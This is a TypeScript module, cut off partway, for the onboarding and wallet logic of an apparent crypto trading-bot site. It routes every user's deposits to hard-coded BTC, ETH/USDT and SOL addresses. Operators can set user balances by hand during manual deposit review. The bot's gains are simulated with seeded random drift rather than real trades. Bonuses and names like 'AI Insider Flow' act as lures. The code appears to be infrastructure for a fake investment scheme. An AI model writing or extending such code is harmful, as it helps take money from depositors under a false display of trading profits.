import { strategies, type StrategyId } from "@/content/site";

const STORAGE_KEY = "gpt2.tradebot.onboarding-deposit.v2";
const BASE_BOT_TICK_INTERVAL_MS = 8_000;
const MAX_SYNC_TICKS = 240;
const MAX_BOT_EQUITY_HISTORY_POINTS = 72;
const MAX_BOT_TRADE_HISTORY_ITEMS = 12;
export const VERIFICATION_BONUS_USD = 5;
export const DEPOSIT_BONUS_PERCENT = 10;
export const MAX_BOT_GAIN_PERCENT = 30;
export const MAX_BOT_LOSS_PERCENT = 15;

export type ApprovalStatus = "draft" | "approved";
export type OnboardingStepId =
  | "review-access-requirements"
  | "complete-identity-checks"
  | "choose-strategy-track"
  | "activate-account-workflows";

export interface OnboardingStep {
  id: OnboardingStepId;
  title: string;
  description: string;
}

export type DepositTokenCode = "ETH" | "USDT" | "BTC" | "SOL";
export type RefreshTrackingMode = "webhook" | "polling";
export type BotLeverage = "1x" | "5x" | "10x" | "20x";
export type BotRiskLevel = "low" | "medium" | "high";
export type BotStatus = "idle" | "running" | "stopped" | "take_profit_hit" | "stop_loss_hit";

export interface ReviewRequirementsInput {
  residenceCountry: string;
  investorProfile: string;
  acknowledgements: {
    disclosures: boolean;
    eligibility: boolean;
    communications: boolean;
  };
}

export interface IdentityChecksInput {
  fullName: string;
  email: string;
  country: string;
  idType: string;
  notes: string;
}

export interface ActivationInput {
  supportChannel: string;
  reportingCadence: string;
  alertsEnabled: boolean;
  fundingAcknowledgement: boolean;
}

export interface DepositWallet {
  tokenCode: DepositTokenCode;
  tokenName: string;
  networkLabel: string;
  address: string;
  assignedAt: string;
  instructions: string[];
}

export interface WorkflowTransaction {
  id: string;
  tokenCode: DepositTokenCode;
  networkLabel: string;
  address: string;
  amount: string;
  status: string;
  source: string;
  txHash: string;
  detectedAt: string;
}

export interface SimulatedDeposit {
  id: string;
  tokenCode: DepositTokenCode;
  tokenName: string;
  networkLabel: string;
  address: string;
  amountUsd: number;
  source: string;
  txHash: string;
  creditedAt: string;
}

export interface SyncState {
  webhookReady: boolean;
  pollingReady: boolean;
  lastWebhookCheckAt: string | null;
  lastPollingCheckAt: string | null;
}

export interface StartTradingBotInput {
  leverage: BotLeverage;
  stopLossPercent: number;
  takeProfitPercent: number;
  riskLevel: BotRiskLevel;
  strategyLabel: string;
  allocationAmountUsd: number;
}

export interface RecordIncomingDepositInput {
  tokenCode: DepositTokenCode;
  amount: string;
  txHash: string;
  source?: string;
  status?: string;
}

export interface SimulateDepositCreditInput {
  tokenCode: DepositTokenCode;
  amountUsd: number;
}

export type DepositRequestStatus = "pending_review" | "approved" | "rejected";
export type BotTradeHistoryCloseReason =
  | "active"
  | "manual_stop"
  | "withdrawn_to_main_wallet"
  | "take_profit_hit"
  | "stop_loss_hit";

export interface WalletBalanceOverrideInput {
  mainWalletBalanceUsd?: number | null;
  botWalletBalanceUsd?: number | null;
}

export type DepositAddressOverrideInput = Partial<Record<DepositTokenCode, string | null>>;

export interface SubmitDepositRequestInput {
  tokenCode: DepositTokenCode;
  amountUsd: number;
  copiedAt?: string | null;
  submittedByTelegramId?: string | null;
}

export interface ManualDepositReviewInput {
  requestId: string;
  userId?: string;
  status: Exclude<DepositRequestStatus, "pending_review">;
  creditedAmountUsd?: number | null;
  approvalMessage?: string;
  walletBalanceOverrides?: WalletBalanceOverrideInput;
}

export interface DepositRequest {
  id: string;
  tokenCode: DepositTokenCode;
  tokenName: string;
  networkLabel: string;
  address: string;
  requestedAmountUsd: number;
  creditedAmountUsd: number | null;
  depositBonusUsd: number | null;
  totalCreditedAmountUsd: number | null;
  status: DepositRequestStatus;
  copiedAt: string | null;
  submittedAt: string;
  reviewedAt: string | null;
  approvalMessage: string | null;
  submittedByTelegramId?: string | null;
}

export interface BotEquityPoint {
  id: string;
  timestamp: string;
  balanceUsd: number;
  profitUsd: number;
  profitLossPercent: number;
  status: BotStatus;
}

export interface BotTradeHistoryEntry {
  id: string;
  sessionId: string;
  strategyLabel: string;
  tradeLabel: string;
  leverage: BotLeverage;
  riskLevel: BotRiskLevel;
  allocatedAmountUsd: number;
  entryBalanceUsd: number;
  currentBalanceUsd: number;
  profitUsd: number;
  profitLossPercent: number;
  openedAt: string;
  lastUpdatedAt: string;
  closedAt: string | null;
  status: "running" | "closed";
  closeReason: BotTradeHistoryCloseReason;
  settledAmountUsd: number | null;
  settledToMainWalletAt: string | null;
}

export interface TradingBotState {
  status: BotStatus;
  active: boolean;
  allocatedAmountUsd: number;
  startingBalanceUsd: number;
  currentBalanceUsd: number;
  profitUsd: number;
  profitLossPercent: number;
  tradingSettings: StartTradingBotInput | null;
  activeTradeLabel: string | null;
  startedAt: string | null;
  stoppedAt: string | null;
  lastUpdatedAt: string | null;
  sessionId: string | null;
  tickCount: number;
  equityHistory: BotEquityPoint[];
  tradeHistory: BotTradeHistoryEntry[];
}

export interface WorkflowSnapshot {
  userId: string;
  currentStepId: OnboardingStepId;
  completedStepIds: OnboardingStepId[];
  approvalStatus: ApprovalStatus;
  approvedAt: string | null;
  selectedStrategyId: StrategyId | null;
  reviewRequirements: ReviewRequirementsInput;
  identityChecks: IdentityChecksInput;
  activation: ActivationInput;
  depositAddresses: DepositWallet[];
  depositRequests: DepositRequest[];
  transactions: WorkflowTransaction[];
  syncState: SyncState;
  simulatedDeposits: SimulatedDeposit[];
  mainWalletBalanceUsd: number;
  botWalletBalanceUsd: number;
  bonusUsd: number;
  bonusLocked: boolean;
  bonusGrantedAt: string | null;
  idVerificationRequests: IdVerificationRequest[];
  dashboardUnlocked: boolean;
  bot: TradingBotState;
  updatedAt: string;
}

export type IdVerificationStatus = "pending_review" | "approved" | "rejected";

export interface IdVerificationRequest {
  id: string;
  idType: string;
  fileName: string | null;
  fileDataBase64: string | null;
  status: IdVerificationStatus;
  submittedAt: string;
  reviewedAt: string | null;
  approvalMessage: string | null;
}

export const onboardingSteps: OnboardingStep[] = [
  {
    id: "review-access-requirements",
    title: "Review the basics",
    description: "Confirm your country, account use, and a few quick funding rules before you continue.",
  },
  {
    id: "complete-identity-checks",
    title: "Add your details",
    description: "Tell us who you are so your account, funding page, and trade room stay linked to the right person.",
  },
  {
    id: "choose-strategy-track",
    title: "Pick your trading style",
    description: "Choose the bot pace that feels right for you before you open your trade room.",
  },
  {
    id: "activate-account-workflows",
    title: "Finish and unlock",
    description: "Approve your setup to open funding, receive your $5 starter balance, and unlock a 10% bonus on every approved deposit.",
  },
];

const depositWalletTemplates: Array<Omit<DepositWallet, "address" | "assignedAt">> = [
  {
    tokenCode: "ETH",
    tokenName: "Ethereum",
    networkLabel: "ERC20",
    instructions: [
      "Send only on the Ethereum network shown on this card.",
      "Use a wallet or exchange account you control so your transfer can be matched quickly.",
    ],
  },
  {
    tokenCode: "USDT",
    tokenName: "Tether USD",
    networkLabel: "ERC20",
    instructions: [
      "Use the ERC20 network shown here. Sending from another network can delay your funding review.",
      "Double-check the address before sending so your transfer lands on the correct chain.",
    ],
  },
  {
    tokenCode: "BTC",
    tokenName: "Bitcoin",
    networkLabel: "Bitcoin",
    instructions: [
      "Send only native BTC to this address.",
      "Wait for network confirmations before expecting the balance to appear in your account.",
    ],
  },
  {
    tokenCode: "SOL",
    tokenName: "Solana",
    networkLabel: "Solana",
    instructions: [
      "Send only native SOL on the Solana network.",
      "Check the address carefully before sending because Solana transfers settle quickly.",
    ],
  },
];

const FIXED_DEPOSIT_ADDRESSES: Record<DepositTokenCode, string> = {
  ETH: "0xF3A288bba1289382546033860bF227e91ccA09b8",
  USDT: "0xF3A288bba1289382546033860bF227e91ccA09b8",
  BTC: "bc1qceer3q42etntav23x7mg6y9ntgq5yg5n8j4ysy",
  SOL: "8UryNXnqqA9vGgpNChX5m6TVCnHbeC8GbpVmeaGxHVvW",
};

const leverageMultipliers: Record<BotLeverage, number> = {
  "1x": 0.55,
  "5x": 0.9,
  "10x": 1.18,
  "20x": 1.45,
};

const leverageCadenceMultipliers: Record<BotLeverage, number> = {
  "1x": 1.35,
  "5x": 1,
  "10x": 0.72,
  "20x": 0.46,
};

const riskCadenceMultipliers: Record<BotRiskLevel, number> = {
  low: 1.08,
  medium: 1,
  high: 0.84,
};

const riskVolatility: Record<BotRiskLevel, number> = {
  low: 0.03,
  medium: 0.045,
  high: 0.06,
};

const riskBaseReturn: Record<BotRiskLevel, number> = {
  low: 0.012,
  medium: 0.018,
  high: 0.024,
};

const riskReturnMultipliers: Record<BotRiskLevel, number> = {
  low: 0.92,
  medium: 1,
  high: 1.14,
};

const strategyDrift: Record<StrategyId, number> = {
  "conservative-growth": 0.004,
  "balanced-portfolio": 0.008,
  "aggressive-growth": 0.012,
};

const clampNumber = (value: number, minimum: number, maximum: number) =>
  Math.min(maximum, Math.max(minimum, value));

export const getBotExecutionCadenceMs = (
  settings: Pick<StartTradingBotInput, "leverage" | "riskLevel"> | null | undefined,
) => {
  if (!settings) {
    return BASE_BOT_TICK_INTERVAL_MS;
  }

  const nextCadence = BASE_BOT_TICK_INTERVAL_MS
    * leverageCadenceMultipliers[settings.leverage]
    * riskCadenceMultipliers[settings.riskLevel];

  return Math.round(clampNumber(nextCadence, 2_400, 12_000) / 100) * 100;
};

export const getBotExecutionSpeedLabel = (
  settings: Pick<StartTradingBotInput, "leverage" | "riskLevel"> | null | undefined,
) => {
  const cadenceMs = getBotExecutionCadenceMs(settings);

  if (cadenceMs <= 3_000) {
    return "Hyper";
  }

  if (cadenceMs <= 4_800) {
    return "Turbo";
  }

  if (cadenceMs <= 7_000) {
    return "Adaptive";
  }

  return "Measured";
};

let memoryStorage: string | null = null;

const defaultReviewRequirements = (): ReviewRequirementsInput => ({
  residenceCountry: "",
  investorProfile: "",
  acknowledgements: {
    disclosures: false,
    eligibility: false,
    communications: false,
  },
});

const defaultIdentityChecks = (): IdentityChecksInput => ({
  fullName: "",
  email: "",
  country: "",
  idType: "",
  notes: "",
});

const defaultActivation = (): ActivationInput => ({
  supportChannel: "email",
  reportingCadence: "weekly",
  alertsEnabled: true,
  fundingAcknowledgement: false,
});

const defaultBotState = (): TradingBotState => ({
  status: "idle",
  active: false,
  allocatedAmountUsd: 0,
  startingBalanceUsd: 0,
  currentBalanceUsd: 0,
  profitUsd: 0,
  profitLossPercent: 0,
  tradingSettings: null,
  activeTradeLabel: null,
  startedAt: null,
  stoppedAt: null,
  lastUpdatedAt: null,
  sessionId: null,
  tickCount: 0,
  equityHistory: [],
  tradeHistory: [],
});

const nowIso = () => new Date().toISOString();

const roundCurrency = (value: number) => Math.round(value * 100) / 100;

export const calculateDepositBonusUsd = (value: number) =>
  roundCurrency((Number.isFinite(value) ? value : 0) * (DEPOSIT_BONUS_PERCENT / 100));

export const getDepositTotalWithBonusUsd = (value: number) =>
  roundCurrency((Number.isFinite(value) ? value : 0) + calculateDepositBonusUsd(value));

const getLocalStorage = (): Storage | null => {
  if (typeof window === "undefined") {
    return null;
  }

  try {
    return window.localStorage;
  } catch {
    return null;
  }
};

const createWorkflowUserId = () => {
  if (typeof globalThis.crypto?.randomUUID === "function") {
    return `mtc-${globalThis.crypto.randomUUID().slice(0, 12)}`;
  }

  return `mtc-${Math.random().toString(36).slice(2, 10)}`;
};

const createEntityId = (prefix: string) => {
  if (typeof globalThis.crypto?.randomUUID === "function") {
    return `${prefix}-${globalThis.crypto.randomUUID()}`;
  }

  return `${prefix}-${Math.random().toString(36).slice(2, 12)}`;
};

const readStorageRaw = () => {
  const localStorage = getLocalStorage();

  if (localStorage) {
    return localStorage.getItem(STORAGE_KEY);
  }

  return memoryStorage;
};

const writeStorage = (snapshot: WorkflowSnapshot) => {
  const serialized = JSON.stringify(snapshot);
  memoryStorage = serialized;

  const localStorage = getLocalStorage();
  if (localStorage) {
    localStorage.setItem(STORAGE_KEY, serialized);
  }
};

const removeStorage = () => {
  memoryStorage = null;

  const localStorage = getLocalStorage();
  if (localStorage) {
    localStorage.removeItem(STORAGE_KEY);
  }
};

const defaultSnapshot = (): WorkflowSnapshot => ({
  userId: createWorkflowUserId(),
  currentStepId: onboardingSteps[0].id,
  completedStepIds: [],
  approvalStatus: "draft",
  approvedAt: null,
  selectedStrategyId: null,
  reviewRequirements: defaultReviewRequirements(),
  identityChecks: defaultIdentityChecks(),
  activation: defaultActivation(),
  depositAddresses: [],
  depositRequests: [],
  transactions: [],
  syncState: {
    webhookReady: true,
    pollingReady: true,
    lastWebhookCheckAt: null,
    lastPollingCheckAt: null,
  },
  simulatedDeposits: [],
  mainWalletBalanceUsd: 0,
  botWalletBalanceUsd: 0,
  bonusUsd: 0,
  bonusLocked: false,
  bonusGrantedAt: null,
  idVerificationRequests: [],
  dashboardUnlocked: false,
  bot: defaultBotState(),
  updatedAt: nowIso(),
});

const sanitizeNumber = (value: unknown) => {
  const parsed = typeof value === "string" ? Number.parseFloat(value) : Number(value);
  return Number.isFinite(parsed) ? roundCurrency(parsed) : 0;
};

const shouldUnlockDashboard = (snapshot: Partial<WorkflowSnapshot>) =>
  snapshot.dashboardUnlocked === true ||
  sanitizeNumber(snapshot.mainWalletBalanceUsd) > 0 ||
  sanitizeNumber(snapshot.botWalletBalanceUsd) > 0 ||
  (snapshot.simulatedDeposits?.length ?? 0) > 0;

const normalizeDepositRequestStatus = (status: unknown): DepositRequestStatus => {
  if (status === "approved" || status === "rejected") {
    return status;
  }

  return "pending_review";
};

const normalizeStepIds = (stepIds: OnboardingStepId[]) =>
  onboardingSteps.map((step) => step.id).filter((stepId) => stepIds.includes(stepId));

const normalizeSnapshot = (snapshot: Partial<WorkflowSnapshot> | null | undefined): WorkflowSnapshot => {
  const fallback = defaultSnapshot();

  if (!snapshot) {
    return fallback;
  }

  const normalizedBot: TradingBotState = {
    ...defaultBotState(),
    ...snapshot.bot,
    allocatedAmountUsd: sanitizeNumber(snapshot.bot?.allocatedAmountUsd),
    startingBalanceUsd: sanitizeNumber(snapshot.bot?.startingBalanceUsd),
    currentBalanceUsd: sanitizeNumber(snapshot.bot?.currentBalanceUsd),
    profitUsd: sanitizeNumber(snapshot.bot?.profitUsd),
    profitLossPercent: sanitizeNumber(snapshot.bot?.profitLossPercent),
    tickCount: Number.isFinite(snapshot.bot?.tickCount) ? Number(snapshot.bot?.tickCount) : 0,
    equityHistory: (snapshot.bot?.equityHistory ?? []).map((point) => ({
      id: point.id,
      timestamp: point.timestamp,
      balanceUsd: sanitizeNumber(point.balanceUsd),
      profitUsd: sanitizeNumber(point.profitUsd),
      profitLossPercent: sanitizeNumber(point.profitLossPercent),
      status: point.status,
    })),
    tradeHistory: (snapshot.bot?.tradeHistory ?? []).map((entry) => ({
      id: entry.id,
      sessionId: entry.sessionId,
      strategyLabel: entry.strategyLabel,
      tradeLabel: entry.tradeLabel,
      leverage: entry.leverage,
      riskLevel: entry.riskLevel,
      allocatedAmountUsd: sanitizeNumber(entry.allocatedAmountUsd),
      entryBalanceUsd: sanitizeNumber(entry.entryBalanceUsd),
      currentBalanceUsd: sanitizeNumber(entry.currentBalanceUsd),
      profitUsd: sanitizeNumber(entry.profitUsd),
      profitLossPercent: sanitizeNumber(entry.profitLossPercent),
      openedAt: entry.openedAt,
      lastUpdatedAt: entry.lastUpdatedAt,
      closedAt: entry.closedAt ?? null,
      status: entry.status === "closed" ? "closed" : "running",
      closeReason: entry.closeReason ?? (entry.status === "closed" ? "manual_stop" : "active"),
      settledAmountUsd: entry.settledAmountUsd == null ? null : sanitizeNumber(entry.settledAmountUsd),
      settledToMainWalletAt: entry.settledToMainWalletAt ?? null,
    })),
  };

  const mainWalletBalanceUsd = sanitizeNumber(snapshot.mainWalletBalanceUsd);
  const storedBotWalletBalanceUsd = sanitizeNumber(snapshot.botWalletBalanceUsd);
  const botWalletBalanceUsd = normalizedBot.active ? normalizedBot.currentBalanceUsd : storedBotWalletBalanceUsd;

  return {
    ...fallback,
    ...snapshot,
    currentStepId: snapshot.currentStepId ?? fallback.currentStepId,
    completedStepIds: normalizeStepIds(snapshot.completedStepIds ?? fallback.completedStepIds),
    selectedStrategyId:
      snapshot.selectedStrategyId && strategies.some((strategy) => strategy.id === snapshot.selectedStrategyId)
        ? snapshot.selectedStrategyId
        : fallback.selectedStrategyId,
    reviewRequirements: {
      ...defaultReviewRequirements(),
      ...snapshot.reviewRequirements,
      acknowledgements: {
        ...defaultReviewRequirements().acknowledgements,
        ...snapshot.reviewRequirements?.acknowledgements,
      },
    },
    identityChecks: {
      ...defaultIdentityChecks(),
      ...snapshot.identityChecks,
    },
    activation: {
      ...defaultActivation(),
      ...snapshot.activation,
    },
    depositAddresses: snapshot.depositAddresses ?? fallback.depositAddresses,
    depositRequests: (snapshot.depositRequests ?? fallback.depositRequests).map((request) => ({
      ...request,
      requestedAmountUsd: sanitizeNumber(request.requestedAmountUsd),
      creditedAmountUsd: request.creditedAmountUsd == null ? null : sanitizeNumber(request.creditedAmountUsd),
      depositBonusUsd: request.depositBonusUsd == null ? null : sanitizeNumber(request.depositBonusUsd),
      totalCreditedAmountUsd:
        request.totalCreditedAmountUsd == null ? null : sanitizeNumber(request.totalCreditedAmountUsd),
      status: normalizeDepositRequestStatus(request.status),
      copiedAt: request.copiedAt ?? null,
      reviewedAt: request.reviewedAt ?? null,
      approvalMessage: request.approvalMessage ?? null,
    })),
    transactions: snapshot.transactions ?? fallback.transactions,
    syncState: {
      ...fallback.syncState,
      ...snapshot.syncState,
    },
    simulatedDeposits: (snapshot.simulatedDeposits ?? fallback.simulatedDeposits).map((deposit) => ({
      ...deposit,
      amountUsd: sanitizeNumber(deposit.amountUsd),
      source: deposit.source ?? "deposit",
    })),
    mainWalletBalanceUsd,
    botWalletBalanceUsd,
    bonusUsd: sanitizeNumber(snapshot.bonusUsd),
    bonusLocked: snapshot.bonusLocked === true,
    bonusGrantedAt: snapshot.bonusGrantedAt ?? null,
    dashboardUnlocked: shouldUnlockDashboard(snapshot),
    bot: normalizedBot,
    updatedAt: snapshot.updatedAt ?? fallback.updatedAt,
  };
};

const readStoredSnapshot = () => {
  const rawSnapshot = readStorageRaw();

  if (!rawSnapshot) {
    const snapshot = defaultSnapshot();
    writeStorage(snapshot);
    return snapshot;
  }

  try {
    const snapshot = normalizeSnapshot(JSON.parse(rawSnapshot) as Partial<WorkflowSnapshot>);
    writeStorage(snapshot);
    return snapshot;
  } catch {
    const snapshot = defaultSnapshot();
    writeStorage(snapshot);
    return snapshot;
  }
};

const getWorkflowStepIndex = (stepId: OnboardingStepId) => onboardingSteps.findIndex((step) => step.id === stepId);

const canOpenWorkflowStep = (snapshot: WorkflowSnapshot, stepId: OnboardingStepId) => {
  if (snapshot.completedStepIds.includes(stepId)) {
    return true;
  }

  const stepIndex = getWorkflowStepIndex(stepId);
  return onboardingSteps.slice(0, stepIndex).every((step) => snapshot.completedStepIds.includes(step.id));
};

const getNextIncompleteStepId = (completedStepIds: OnboardingStepId[]) =>
  onboardingSteps.find((step) => !completedStepIds.includes(step.id))?.id ?? onboardingSteps[onboardingSteps.length - 1].id;

const completeStep = (snapshot: WorkflowSnapshot, stepId: OnboardingStepId) => {
  const completedStepIds = normalizeStepIds([...snapshot.completedStepIds, stepId]);
  const currentStepId =
    getWorkflowStepIndex(snapshot.currentStepId) <= getWorkflowStepIndex(stepId)
      ? getNextIncompleteStepId(completedStepIds)
      : snapshot.currentStepId;

  return {
    completedStepIds,
    currentStepId,
  };
};

const hashString = (value: string) => {
  let hash = 2_166_136_261;

  for (let index = 0; index < value.length; index += 1) {
    hash ^= value.charCodeAt(index);
    hash = Math.imul(hash, 16_777_619);
  }

  return hash >>> 0;
};

const seededString = (seed: string, length: number, alphabet: string) => {
  let current = hashString(seed);
  let output = "";

  for (let index = 0; index < length; index += 1) {
    current = (Math.imul(current, 1_664_525) + 1_013_904_223) >>> 0;
    output += alphabet[current % alphabet.length];
  }

  return output;
};

const seedToSignedUnit = (seed: string) => (hashString(seed) / 4_294_967_295) * 2 - 1;

const buildEthAddress = (seed: string) => `0x${seededString(seed, 40, "0123456789abcdef")}`;
const buildUsdtAddress = (seed: string) => `T${seededString(seed, 33, "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz")}`;
const buildBtcAddress = (seed: string) => `bc1q${seededString(seed, 38, "qpzry9x8gf2tvdw0s3jn54khce6mua7l")}`;

const buildWalletAddress = (userId: string, tokenCode: DepositTokenCode) => {
  const fixedAddress = FIXED_DEPOSIT_ADDRESSES[tokenCode];
  if (fixedAddress) {
    return fixedAddress;
  }

  const seed = `${userId}:${tokenCode}`;

  switch (tokenCode) {
    case "ETH":
      return buildEthAddress(seed);
    case "USDT":
      return buildUsdtAddress(seed);
    case "BTC":
      return buildBtcAddress(seed);
    case "SOL":
      return FIXED_DEPOSIT_ADDRESSES.SOL;
  }
};

const createDepositAddresses = (snapshot: WorkflowSnapshot) => {
  if (snapshot.depositAddresses.length > 0) {
    return snapshot.depositAddresses;
  }

  return depositWalletTemplates.map((template) => ({
    ...template,
    address: buildWalletAddress(snapshot.userId, template.tokenCode),
    assignedAt: nowIso(),
  }));
};

export const applyDepositAddressOverridesToSnapshot = (
  snapshot: WorkflowSnapshot,
  overrides: DepositAddressOverrideInput,
): WorkflowSnapshot => {
  const baseAddresses = createDepositAddresses(snapshot);

  return {
    ...snapshot,
    depositAddresses: baseAddresses.map((wallet) => {
      const nextAddress = overrides[wallet.tokenCode];
      const trimmedAddress = typeof nextAddress === "string" ? nextAddress.trim() : "";

      return trimmedAddress
        ? {
            ...wallet,
            address: trimmedAddress,
          }
        : wallet;
    }),
  };
};

const getStrategyLabel = (strategyId: StrategyId | null) =>
  strategies.find((strategy) => strategy.id === strategyId)?.title ?? "AI Insider Flow";

const getActiveTradeLabel = (snapshot: WorkflowSnapshot, riskLevel: BotRiskLevel) => {
  const strategyLabel = getStrategyLabel(snapshot.selectedStrategyId);

  switch (riskLevel) {
    case "low":
      return `${strategyLabel} / Fresh listing scout`;
    case "medium":
      return `${strategyLabel} / Launch momentum tracker`;
    case "high":
      return `${strategyLabel} / Release breakout sniper`;
  }
};

const appendBotEquityPoint = (history: BotEquityPoint[], point: BotEquityPoint) => {
  const lastPoint = history.at(-1);

  if (lastPoint?.timestamp === point.timestamp) {
    return [...history.slice(0, -1), point].slice(-MAX_BOT_EQUITY_HISTORY_POINTS);
  }

  return [...history, point].slice(-MAX_BOT_EQUITY_HISTORY_POINTS);
};

const createBotEquityPoint = (
  sessionId: string,
  timestamp: string,
  balanceUsd: number,
  startingBalanceUsd: number,
  status: BotStatus,
  sequence: number,
): BotEquityPoint => {
  const profitUsd = roundCurrency(balanceUsd - startingBalanceUsd);
  const profitLossPercent = startingBalanceUsd > 0 ? roundCurrency((profitUsd / startingBalanceUsd) * 100) : 0;

  return {
    id: `${sessionId}:${sequence}`,
    timestamp,
    balanceUsd: roundCurrency(balanceUsd),
    profitUsd,
    profitLossPercent,
    status,
  };
};

const createBotTradeHistoryEntry = (
  sessionId: string,
  input: StartTradingBotInput & { strategyLabel: string },
  tradeLabel: string,
  openedAt: string,
  entryBalanceUsd: number,
): BotTradeHistoryEntry => ({
  id: createEntityId("bot-trade"),
  sessionId,
  strategyLabel: input.strategyLabel,
  tradeLabel,
  leverage: input.leverage,
  riskLevel: input.riskLevel,
  allocatedAmountUsd: roundCurrency(input.allocationAmountUsd),
  entryBalanceUsd: roundCurrency(entryBalanceUsd),
  currentBalanceUsd: roundCurrency(entryBalanceUsd),
  profitUsd: 0,
  profitLossPercent: 0,
  openedAt,
  lastUpdatedAt: openedAt,
  closedAt: null,
  status: "running",
  closeReason: "active",
  settledAmountUsd: null,
  settledToMainWalletAt: null,
});

const updateBotTradeHistoryEntry = (
  history: BotTradeHistoryEntry[],
  sessionId: string | null,
  updater: (entry: BotTradeHistoryEntry) => BotTradeHistoryEntry,
) => {
  if (!sessionId) {
    return history;
  }

  const index = history.findIndex((entry) => entry.sessionId === sessionId);

  if (index === -1) {
    return history;
  }

  const nextHistory = [...history];
  nextHistory[index] = updater(nextHistory[index]);
  return nextHistory;
};

const settleBotBalanceToMainWallet = (
  snapshot: WorkflowSnapshot,
  input: {
    closeReason?: BotTradeHistoryCloseReason;
    settledAmountUsd?: number;
    settledAt?: string;
    status?: BotStatus;
  } = {},
) => {
  const settledAt = input.settledAt ?? nowIso();
  const settledAmountUsd = roundCurrency(input.settledAmountUsd ?? snapshot.botWalletBalanceUsd ?? snapshot.bot.currentBalanceUsd);

  if (settledAmountUsd <= 0) {
    return ensureDashboardState(snapshot);
  }

  const startingBalanceUsd = snapshot.bot.startingBalanceUsd || settledAmountUsd;
  const currentBalanceUsd = roundCurrency(snapshot.bot.currentBalanceUsd || settledAmountUsd);
  const profitUsd = roundCurrency(currentBalanceUsd - startingBalanceUsd);
  const profitLossPercent = startingBalanceUsd > 0 ? roundCurrency((profitUsd / startingBalanceUsd) * 100) : 0;

  return ensureDashboardState({
    ...snapshot,
    mainWalletBalanceUsd: roundCurrency(snapshot.mainWalletBalanceUsd + settledAmountUsd),
    botWalletBalanceUsd: 0,
    bot: {
      ...snapshot.bot,
      active: false,
      status: input.status ?? snapshot.bot.status,
      stoppedAt: snapshot.bot.stoppedAt ?? settledAt,
      lastUpdatedAt: settledAt,
      currentBalanceUsd,
      profitUsd,
      profitLossPercent,
      tradeHistory: updateBotTradeHistoryEntry(snapshot.bot.tradeHistory, snapshot.bot.sessionId, (entry) => ({
        ...entry,
        currentBalanceUsd,
        profitUsd,
        profitLossPercent,
        lastUpdatedAt: settledAt,
        closedAt: entry.closedAt ?? settledAt,
        status: "closed",
        closeReason: entry.closeReason === "active" ? input.closeReason ?? "withdrawn_to_main_wallet" : entry.closeReason,
        settledAmountUsd,
        settledToMainWalletAt: settledAt,
      })),
    },
  });
};

const applyWalletBalanceOverrides = (snapshot: WorkflowSnapshot, overrides: WalletBalanceOverrideInput = {}) => {
  const hasMainWalletOverride = overrides.mainWalletBalanceUsd !== undefined && overrides.mainWalletBalanceUsd !== null;
  const hasBotWalletOverride = overrides.botWalletBalanceUsd !== undefined && overrides.botWalletBalanceUsd !== null;

  const mainWalletBalanceUsd = hasMainWalletOverride
    ? sanitizeNumber(overrides.mainWalletBalanceUsd)
    : snapshot.mainWalletBalanceUsd;
  const botWalletBalanceUsd = hasBotWalletOverride
    ? sanitizeNumber(overrides.botWalletBalanceUsd)
    : snapshot.botWalletBalanceUsd;

  const bot = hasBotWalletOverride
    ? {
        ...snapshot.bot,
        currentBalanceUsd: botWalletBalanceUsd,
        allocatedAmountUsd: snapshot.bot.active ? snapshot.bot.allocatedAmountUsd : botWalletBalanceUsd,
        startingBalanceUsd: snapshot.bot.active ? snapshot.bot.startingBalanceUsd : botWalletBalanceUsd,
        profitUsd: snapshot.bot.active ? snapshot.bot.profitUsd : 0,
        profitLossPercent: snapshot.bot.active ? snapshot.bot.profitLossPercent : 0,
      }
    : snapshot.bot;

  return ensureDashboardState({
    ...snapshot,
    mainWalletBalanceUsd,
    botWalletBalanceUsd,
    bot,
  });
};

const hasConfirmedDepositCreditInternal = (snapshot: WorkflowSnapshot) =>
  snapshot.depositRequests.some((request) => request.status === "approved") ||
  snapshot.simulatedDeposits.some((deposit) => deposit.source !== "verification bonus");

const ensureVerificationBonus = (snapshot: WorkflowSnapshot): WorkflowSnapshot => {
  if (snapshot.approvalStatus !== "approved") {
    return snapshot;
  }

  const existingBonusUsd = sanitizeNumber(snapshot.bonusUsd);
  const nextBonusUsd = existingBonusUsd > 0 ? existingBonusUsd : VERIFICATION_BONUS_USD;
  const totalVisibleBalance = roundCurrency(snapshot.mainWalletBalanceUsd + snapshot.botWalletBalanceUsd);

  if (snapshot.bonusGrantedAt || (existingBonusUsd > 0 && totalVisibleBalance >= existingBonusUsd)) {
    return {
      ...snapshot,
      bonusUsd: nextBonusUsd,
      bonusGrantedAt: snapshot.bonusGrantedAt ?? snapshot.approvedAt ?? nowIso(),
    };
  }

  return {
    ...snapshot,
    mainWalletBalanceUsd: roundCurrency(snapshot.mainWalletBalanceUsd + nextBonusUsd),
    bonusUsd: nextBonusUsd,
    bonusGrantedAt: snapshot.approvedAt ?? nowIso(),
  };
};

const ensureDashboardState = (snapshot: WorkflowSnapshot): WorkflowSnapshot => {
  const bonusLocked = snapshot.bonusUsd > 0 ? !hasConfirmedDepositCreditInternal(snapshot) : false;
  const botWalletBalanceUsd = snapshot.bot.active ? snapshot.bot.currentBalanceUsd : snapshot.botWalletBalanceUsd;

  return {
    ...snapshot,
    bonusLocked,
    botWalletBalanceUsd: roundCurrency(botWalletBalanceUsd),
    dashboardUnlocked:
      snapshot.dashboardUnlocked ||
      snapshot.mainWalletBalanceUsd > 0 ||
      snapshot.bot.currentBalanceUsd > 0 ||
      snapshot.simulatedDeposits.length > 0,
  };
};

const syncTradingBotState = (snapshot: WorkflowSnapshot, now = new Date()): WorkflowSnapshot => {
  if (!snapshot.bot.active || !snapshot.bot.tradingSettings || !snapshot.bot.lastUpdatedAt || !snapshot.bot.sessionId) {
    return snapshot;
  }

  const lastUpdatedAt = new Date(snapshot.bot.lastUpdatedAt);
  const elapsedMs = now.getTime() - lastUpdatedAt.getTime();
  const tickIntervalMs = getBotExecutionCadenceMs(snapshot.bot.tradingSettings);
  const elapsedTicks = Math.floor(elapsedMs / tickIntervalMs);

  if (elapsedTicks <= 0) {
    return snapshot;
  }

  const appliedTicks = Math.min(elapsedTicks, MAX_SYNC_TICKS);
  const startingBalanceUsd = snapshot.bot.startingBalanceUsd || snapshot.bot.currentBalanceUsd;
  const strategyBonus = strategyDrift[snapshot.selectedStrategyId ?? "balanced-portfolio"];
  const { leverage, riskLevel, stopLossPercent, takeProfitPercent } = snapshot.bot.tradingSettings;
  const cappedStopLossPercent = Math.min(stopLossPercent, MAX_BOT_LOSS_PERCENT);
